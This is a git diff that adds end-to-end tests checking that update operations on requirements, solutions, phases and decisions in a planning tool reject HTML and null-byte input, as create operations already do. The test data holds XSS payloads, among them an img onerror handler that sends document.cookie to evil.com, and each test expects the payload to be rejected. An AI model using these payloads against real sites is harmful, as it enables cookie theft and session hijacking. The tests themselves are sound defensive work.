@@ -799,4 +799,234 @@ describe('E2E: Input Sanitization Security Fixes (GREEN Phase)', () => {
       expect(req.requirementId).toBeDefined();
     });
   });
+
+  // ============================================================
+  // M-1, M-2: Update Operations Must Apply Same Validation as Create
+  // ============================================================
+  describe('Update Operations Validation Bypass Prevention', () => {
+    let testRequirementId: string;
+    let testSolutionId: string;
+    let testPhaseId: string;
+    let testDecisionId: string;
+
+    beforeAll(async () => {
+      // Create valid entities first
+      const reqResult = await client.callTool({
+        name: 'requirement',
+        arguments: {
+          action: 'add',
+          planId,
+          requirement: {
+            title: 'Update Test Requirement',
+            description: 'Valid description',
+            category: 'functional',
+            priority: 'high',
+            source: { type: 'user-request' },
+          },
+        },
+      });
+      testRequirementId = parseResult<{ requirementId: string }>(reqResult).requirementId;
+
+      const solResult = await client.callTool({
+        name: 'solution',
+        arguments: {
+          action: 'propose',
+          planId,
+          solution: {
+            title: 'Update Test Solution',
+            description: 'Valid solution',
+            approach: 'Valid approach',
+          },
+        },
+      });
+      testSolutionId = parseResult<{ solutionId: string }>(solResult).solutionId;
+
+      const phaseResult = await client.callTool({
+        name: 'phase',
+        arguments: {
+          action: 'add',
+          planId,
+          phase: {
+            title: 'Update Test Phase',
+            description: 'Valid phase',
+          },
+        },
+      });
+      testPhaseId = parseResult<{ phaseId: string }>(phaseResult).phaseId;
+
+      const decisionResult = await client.callTool({
+        name: 'decision',
+        arguments: {
+          action: 'record',
+          planId,
+          decision: {
+            title: 'Update Test Decision',
+            question: 'What to do?',
+            decision: 'Do this',
+            context: 'Valid context',
+            consequences: 'Valid consequences',
+          },
+        },
+      });
+      testDecisionId = parseResult<{ decisionId: string }>(decisionResult).decisionId;
+    });
+
+    // M-2: Requirement update must validate description/rationale
+    it('should reject XSS in requirement.description via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'requirement',
+          arguments: {
+            action: 'update',
+            planId,
+            requirementId: testRequirementId,
+            updates: {
+              description: '<script>alert("XSS via update")</script>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    it('should reject XSS in requirement.rationale via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'requirement',
+          arguments: {
+            action: 'update',
+            planId,
+            requirementId: testRequirementId,
+            updates: {
+              rationale: '<img src=x onerror=alert("XSS")>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    // M-2: Solution update must validate description/approach
+    it('should reject XSS in solution.description via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'solution',
+          arguments: {
+            action: 'update',
+            planId,
+            solutionId: testSolutionId,
+            updates: {
+              description: '<script>malicious()</script>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    it('should reject XSS in solution.approach via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'solution',
+          arguments: {
+            action: 'update',
+            planId,
+            solutionId: testSolutionId,
+            updates: {
+              approach: '<iframe src="http://evil.com"></iframe>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    // M-2: Phase update already validates implementationNotes (line 544), but need description
+    it('should reject XSS in phase.description via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'phase',
+          arguments: {
+            action: 'update',
+            planId,
+            phaseId: testPhaseId,
+            updates: {
+              description: '<script>document.cookie</script>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    // M-1: Decision update must validate context/consequences
+    it('should reject XSS in decision.context via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'decision',
+          arguments: {
+            action: 'update',
+            planId,
+            decisionId: testDecisionId,
+            updates: {
+              context: '<script>stealCredentials()</script>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    it('should reject XSS in decision.consequences via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'decision',
+          arguments: {
+            action: 'update',
+            planId,
+            decisionId: testDecisionId,
+            updates: {
+              consequences: '<img onerror="fetch(\'http://evil.com/?\'+document.cookie)" src=x>',
+            },
+          },
+        }),
+        /HTML tags/i
+      );
+    });
+
+    // Null byte injection via update
+    it('should reject null bytes in requirement.description via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'requirement',
+          arguments: {
+            action: 'update',
+            planId,
+            requirementId: testRequirementId,
+            updates: {
+              description: 'Valid start\x00hidden payload',
+            },
+          },
+        }),
+        /null bytes/i
+      );
+    });
+
+    it('should reject null bytes in decision.context via update', async () => {
+      await expectError(
+        client.callTool({
+          name: 'decision',
+          arguments: {
+            action: 'update',
+            planId,
+            decisionId: testDecisionId,
+            updates: {
+              context: 'Context\x00with null byte',
+            },
+          },
+        }),
+        /null bytes/i
+      );
+    });
+  });
 });
